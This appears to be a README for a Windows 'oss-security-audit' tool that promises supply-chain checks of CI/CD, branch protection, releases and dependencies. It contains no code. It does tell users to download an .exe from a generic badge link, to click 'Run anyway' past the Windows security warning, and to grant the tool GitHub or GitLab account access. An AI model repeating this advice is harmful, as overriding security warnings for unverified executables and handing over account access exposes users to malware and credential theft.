# 🛡️ oss-security-audit - Secure your code supply chain easily

[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/lucas01feh/oss-security-audit)

## 📂 What this tool does

The oss-security-audit tool checks your software project for security risks. It looks at how you build, test, and release your code. The tool spots dangerous settings in your account and your project files. It generates a simple report in your web browser. This report highlights issues that could allow attackers to access your project. 

The security framework ensures you follow industry best practices. It checks your automation triggers, your branch rules, and your dependency updates. It protects your work from common supply chain attacks. You do not need to be a security expert to use this tool. It walks you through each step and identifies what you need to fix.

## 💻 System requirements

Before you begin, ensure your computer meets these requirements:

* Windows 10 or Windows 11.
* A stable internet connection.
* A web browser like Chrome, Edge, or Firefox.
* At least 500 MB of free disk space.
* A GitHub or GitLab account with access to the project you wish to audit.

The software runs locally on your machine. It does not send your code to external servers. It only accesses your repository metadata to verify security settings. This keeps your intellectual property private.

## 🚀 Getting started

Follow these steps to set up and run the audit tool on your Windows machine.

### 1. Download the tool
Visit the link below to reach the download page. Look for the file ending in `.exe` under the latest release section. Save this file to your computer.

[Click here to download the security tool](https://github.com/lucas01feh/oss-security-audit)

### 2. Prepare your system
Navigate to the folder where you saved the file. Double-click the file to start the installer. If Windows prompts you with a security warning, select "Run anyway." A setup window will appear. Follow the on-screen instructions to finish the installation. The setup process creates a shortcut on your desktop.

### 3. Grant permissions
Open the application using the shortcut on your desktop. Upon the first launch, the tool performs a preflight check. It asks for permission to communicate with your project hosting service. You must log in to your GitHub or GitLab account when the browser window opens. This allows the tool to read the settings of the projects you select.

## 🔍 Understanding the security report

Once the tool finishes the scan, it generates an HTML report. You can open this file in any web browser. The report contains five main sections:

### Workflow security
The tool scans your CI/CD configuration files. It checks if you pin your actions to specific versions and if you isolate your secret keys. It alerts you if your workflows run with too many permissions.

### Repository controls
This section checks your administrative rules. It verifies that you require two-factor authentication for your team members. It also ensures that branch protection rules work correctly, preventing people from pushing changes without a review.

### Release security
This part confirms your release process uses trusted publishing methods. It verifies that your deployments happen in secure environments with approval requirements. It checks that your releases remain immutable, meaning nobody can change the code once you publish a version.

### Automation settings
The tool evaluates whether you use GitHub Apps or Actions to trigger changes. It identifies if these triggers have excessive access to your project. It advises you on how to restrict these automations to minimize the risk of unauthorized access.

### Dependency hygiene
This section analyzes the third-party libraries in your project. It checks if you use automated tools to update these dependencies. It also reports on the size of your dependency footprint and highlights known vulnerabilities in the code you include from others.

## 💡 Troubleshooting common issues

If the tool does not work, check these common items:

* Verify your internet connection. A connection is necessary to reach the GitHub or GitLab servers.
* Check your login credentials. If your session expires, the tool will trigger a new login request in your browser.
* Ensure you have administrative rights on the repository. If you have guest access, the tool might lack the permission to read certain project settings.
* Review your browser settings. Sometimes, ad blockers or privacy extensions prevent the login page from loading. Disable these extensions temporarily if you face login issues.

## 🛠️ Frequently asked questions

### Does this tool change my settings?
No. The tool is read-only. It scans your configuration and explains how to fix issues. You must apply the changes manually in your project settings.

### Can I audit private repositories?
Yes. As long as you have the correct access rights, the tool works on both public and private projects.

### How often should I run an audit?
Run the audit every time you change your CI/CD workflows or add new dependencies. A monthly audit is a good practice for project maintenance.

### Who sees the report?
The report is a temporary file created on your machine. You control who sees it. Nobody else can access this file unless you share it with them.

### What happens if I encounter an error?
If the tool crashes, restart the application and try again. The security check is safe to run multiple times. If the problem continues, check for updates to the software. You can find regular updates at the primary download link.

### Does this work on GitLab?
Yes. The tool features built-in support for both GitHub and GitLab. When you launch the tool, it detects your account type and applies the relevant security framework modules.